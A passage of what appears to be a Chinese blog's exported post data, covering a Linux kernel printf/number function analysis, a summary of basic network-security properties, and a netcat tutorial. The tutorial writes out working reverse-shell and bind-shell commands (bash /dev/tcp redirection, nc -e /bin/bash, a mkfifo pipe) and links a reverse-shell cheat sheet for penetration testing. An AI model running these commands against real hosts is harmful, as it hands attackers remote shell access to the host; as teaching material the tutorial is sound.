class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'c'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'s'</span>:</div><div class=\"line\">\t\t\ts = va_arg(args, <span class=\"keyword\">char</span> *);</div><div class=\"line\">\t\t\tlen = strnlen(s, precision);</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; ++i)</div><div class=\"line\">\t\t\t\t*str++ = *s++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'p'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = <span class=\"number\">2</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *);</div><div class=\"line\">\t\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tstr = number(str,</div><div class=\"line\">\t\t\t\t     (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)va_arg(args, <span class=\"keyword\">void</span> *), <span class=\"number\">16</span>,</div><div class=\"line\">\t\t\t\t     field_width, precision, flags);</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'n'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> *ip = va_arg(args, <span class=\"keyword\">long</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> *ip = va_arg(args, <span class=\"keyword\">int</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'%'</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"comment\">/* integer number formats - set up the flags and \"break\" */</span></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'o'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">8</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'x'</span>:</div><div class=\"line\">\t\t\tflags |= SMALL;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'X'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">16</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'d'</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'i'</span>:</div><div class=\"line\">\t\t\tflags |= SIGN;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'u'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">default</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*fmt)</div><div class=\"line\">\t\t\t\t*str++ = *fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t--fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'h'</span>) &#123;</div><div class=\"line\">\t\t\tnum = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\t\tnum = (<span class=\"keyword\">short</span>)num;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (flags &amp; SIGN)</div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\tnum = va_arg(args, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\tstr = number(str, num, base, field_width, precision, flags);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t*str = <span class=\"string\">'\\0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str - buf;</div></pre></td></tr></table></figure></p>\n<h2 id=\"number函数\"><a href=\"#number函数\" class=\"headerlink\" title=\"number函数\"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __do_div(n, base) (&#123; \\</div><div class=\"line\">int __res; \\</div><div class=\"line\">__res = ((unsigned long) n) % (unsigned) base; \\</div><div class=\"line\">n = ((unsigned long) n) / (unsigned) base; \\</div><div class=\"line\">__res; &#125;)</span></div></pre></td></tr></table></figure></p>\n<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascll码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= ~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *<span class=\"title\">number</span><span class=\"params\">(<span class=\"keyword\">char</span> *str, <span class=\"keyword\">long</span> num, <span class=\"keyword\">int</span> base, <span class=\"keyword\">int</span> size, <span class=\"keyword\">int</span> precision,</div><div class=\"line\">\t\t    <span class=\"keyword\">int</span> type)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">\t<span class=\"comment\">/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */</span></div><div class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> digits[<span class=\"number\">16</span>] = <span class=\"string\">\"0123456789ABCDEF\"</span>; <span class=\"comment\">/* \"GHIJKLMNOPQRSTUVWXYZ\"; */</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">char</span> tmp[<span class=\"number\">66</span>];</div><div class=\"line\">\t<span class=\"keyword\">char</span> c, sign, locase;</div><div class=\"line\">\t<span class=\"keyword\">int</span> i;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/* locase = 0 or 0x20. ORing digits or letters with 'locase'</div><div class=\"line\">\t * produces same digits or (maybe lowercased) letters */</span></div><div class=\"line\">\tlocase = (type &amp; SMALL);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; LEFT)</div><div class=\"line\">\t\ttype &amp;= ~ZEROPAD;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (base &lt; <span class=\"number\">2</span> || base &gt; <span class=\"number\">16</span>)</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tc = (type &amp; ZEROPAD) ? <span class=\"string\">'0'</span> : <span class=\"string\">' '</span>;</div><div class=\"line\">\tsign = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SIGN) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (num &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'-'</span>;</div><div class=\"line\">\t\t\tnum = -num;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; PLUS) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">'+'</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (type &amp; SPACE) &#123;</div><div class=\"line\">\t\t\tsign = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>)</div><div class=\"line\">\t\t\tsize -= <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\tsize--;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\ti = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (num == <span class=\"number\">0</span>)</div><div class=\"line\">\t\ttmp[i++] = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (num != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\ttmp[i++] = (digits[<span class=\"number\">__</span>do_div(num, base)] | locase);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (i &gt; precision)</div><div class=\"line\">\t\tprecision = i;</div><div class=\"line\">\tsize -= precision;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; (ZEROPAD + LEFT)))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (sign)</div><div class=\"line\">\t\t*str++ = sign;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (type &amp; SPECIAL) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (base == <span class=\"number\">8</span>)</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (base == <span class=\"number\">16</span>) &#123;</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"string\">'X'</span> | locase);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (!(type &amp; LEFT))</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t*str++ = c;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i &lt; precision--)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = tmp[i];</div><div class=\"line\">\t<span class=\"keyword\">while</span> (size-- &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> str;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"puts\"><a href=\"#puts\" class=\"headerlink\" title=\"puts\"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href=\"http://bbs.pediy.com/showthread.php?t=213153\">文章</a>,如果没注册看不了的话先<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279936&amp;idx=1&amp;sn=2eb47265a0d170c45403d4b5d9097549&amp;chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&amp;scene=0#wechat_redirect\">戳这里吧</a></p>\n"},{"title":"网络安全基本要素及对策","date":"2016-09-18T03:49:15.000Z","_content":"\n\n\n> 昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)\n\n## 机密性\n定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。  \n策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)\n## 完整性\n定义:保证数据的一致性，防止数据被非法用户篡改。  \n策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法\n## 可用性\n定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)  \n策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.\n## 可控性\n定义:对信息的传播及内容具有控制能力。  \n策略:各种访问控制,例如ACL包过滤,防火墙等机制.\n## 不可抵赖性\n定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。  \n策略:数字签名,用公钥密码机制,如RSA等.\n\n","source":"_posts/网络安全基本要素及对策.md","raw":"---\ntitle: 网络安全基本要素及对策\ndate: 2016-09-18 11:49:15\ntags:\n- network security\n- information security\ncategories:\n- study\n- work\n---\n\n\n\n> 昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)\n\n## 机密性\n定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。  \n策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)\n## 完整性\n定义:保证数据的一致性，防止数据被非法用户篡改。  \n策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法\n## 可用性\n定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)  \n策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.\n## 可控性\n定义:对信息的传播及内容具有控制能力。  \n策略:各种访问控制,例如ACL包过滤,防火墙等机制.\n## 不可抵赖性\n定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。  \n策略:数字签名,用公钥密码机制,如RSA等.\n\n","slug":"网络安全基本要素及对策","published":1,"updated":"2016-09-18T04:07:29.699Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7qj000kr1m1vduevitx","content":"<blockquote>\n<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>\n</blockquote>\n<h2 id=\"机密性\"><a href=\"#机密性\" class=\"headerlink\" title=\"机密性\"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>\n<h2 id=\"完整性\"><a href=\"#完整性\" class=\"headerlink\" title=\"完整性\"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>\n<h2 id=\"可用性\"><a href=\"#可用性\" class=\"headerlink\" title=\"可用性\"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>\n<h2 id=\"可控性\"><a href=\"#可控性\" class=\"headerlink\" title=\"可控性\"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>\n<h2 id=\"不可抵赖性\"><a href=\"#不可抵赖性\" class=\"headerlink\" title=\"不可抵赖性\"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>\n","excerpt":"","more":"<blockquote>\n<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>\n</blockquote>\n<h2 id=\"机密性\"><a href=\"#机密性\" class=\"headerlink\" title=\"机密性\"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>\n<h2 id=\"完整性\"><a href=\"#完整性\" class=\"headerlink\" title=\"完整性\"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>\n<h2 id=\"可用性\"><a href=\"#可用性\" class=\"headerlink\" title=\"可用性\"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>\n<h2 id=\"可控性\"><a href=\"#可控性\" class=\"headerlink\" title=\"可控性\"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>\n<h2 id=\"不可抵赖性\"><a href=\"#不可抵赖性\" class=\"headerlink\" title=\"不可抵赖性\"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>\n"},{"title":"NetCat","date":"2016-08-26T06:17:46.000Z","_content":"\n参考资料:\n[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)\n[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)\n[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)\n[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)\n\n---\n\n# 1. nc能干啥？\n能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件....  \nnetcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在\\*nix系统的shell中键入`man nc`查看手册．这里建议先好好学习一下Linux系统中管道(| > < >> <<等)的用法以及文件描述符的相关知识．\n\n---\n# 2. 栗子:\n扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．\n## 1. 聊天:\n我先在终端用ssh连接到一台Linux主机，然后键入`nc -l 8888`在远程机器的本地进行监听，然后在本机再开一个终端键入`nc -n 10.128.54.118 8888`即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为\"0.0.0.0\",表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.\n![nc_liaotian](/images/nc_liaotian.png)\n\n## 2.监听和反弹shell(reverse shell)\n先在一台主机shell环境中键入`nc -l -v -p 8888`,然后在另外一台主机中键入`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在\\*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,`>`后面加上`&`表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流`>`重定向到了网络上，然后后面的`0>&1`表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.\n![Reverse_shell](/images/nc_reverse_shell.png)\n关于反弹shell的代码网络上有很多，比如[这里](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:\n```bash\n$exec 3<>/dev/tcp/10.128.54.118/8888#创建3号文件描述符绑定到一个读写的网络连接\n$cat <&3 | while read line; do $line >&3 2>&1; done#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．\n```\n\n\n## 3. 连接监听的shell(bind shell)\n在Server端：\n```bash\n$nc -l port -e /bin/bash -i\n```\n在Client端：\n```bash\n$nc server_ip port \n```\n一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:\n```bash\n$mkfifo /tmp/tmp_fifo\n$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo\n```\n![bind_shell](/images/nc_bind_shell.png)\n\n## 4. 传送文件\n说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．\n\nSender:\n```bash\n$nc -l Port < file\n```\n\nReceiver:\n```bash\n$nc IP Port > file\n```\n![file_send](/images/nc_file_send.png)\n当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．\n\n---\n\n# 3. 总结\n对于\\*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下...\n","source":"_posts/netcat简述.md","raw":"---\ntitle: NetCat\ndate: 2016-08-26 14:17:46\ntags:\n- network security\n- shell\n- pipe\ncategories:\n- study\n---\n\n参考资料:\n[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)\n[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)\n[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)\n[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)\n\n---\n\n# 1. nc能干啥？\n能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件....  \nnetcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在\\*nix系统的shell中键入`man nc`查看手册．这里建议先好好学习一下Linux系统中管道(| > < >> <<等)的用法以及文件描述符的相关知识．\n\n---\n# 2. 